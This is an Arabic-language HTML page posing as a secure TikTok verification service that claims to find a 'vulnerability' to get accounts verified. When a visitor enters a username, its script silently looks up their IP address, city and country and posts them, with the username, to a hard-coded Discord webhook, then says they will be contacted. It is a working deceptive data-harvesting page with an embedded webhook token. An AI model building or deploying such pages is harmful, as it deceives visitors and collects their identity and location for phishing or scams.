<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>امن جدا توثيق حساب تيك توك</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        .badge { color: #1da1f2; font-size: 50px; margin-bottom: 10px; }
        input { width: 80%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; text-align: center; }
        button { background: #fe2c55; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #e0264d; }
    </style>
</head>
<body>

<div class="card">
    <div class="badge">✔️</div>
    <h2>توثيق حساب تيك توك</h2>
    <p>أدخل اسم المستخدم الخاص بك للبدء في عملية التحقق من الثغرات المتاحة للتوثيق.</p>
    <input type="text" id="username" placeholder="اسم المستخدم (Username)...">
    <button onclick="startProcess()">بدء البحث عن ثغرة</button>
    <p id="status" style="font-size: 12px; color: #666; margin-top: 15px;"></p>
</div>

<script>
async function startProcess() {
    const username = document.getElementById('username').value;
    const status = document.getElementById('status');
    
    if (!username) {
        alert("يرجى إدخال اسم المستخدم");
        return;
    }

    status.innerText = "جاري البحث عن ثغرات...";

    try {

        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        const payload = {
            content: `🚀 **محاولة توثيق جديدة**\n**المستخدم:** ${username}\n**الـ IP:** ${ipData.ip}\n**الموقع:** ${ipData.city}, ${ipData.country_name}`
        };


        await fetch('https://discord.com/api/webhooks/MTU1NTkxNzY0NzUwMDI3OTg1OQ.GzcZYp.zcN6dGS6iyoDXohRqgUElu3BwvV8mgX6PpRHok', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        status.innerText = "تم إرسال البيانات بنجاح. سيتم التواصل معك.";
    } catch (error) {
        status.innerText = "حدث خطأ أثناء الاتصال.";
    }
}
</script>

</body>
</html>
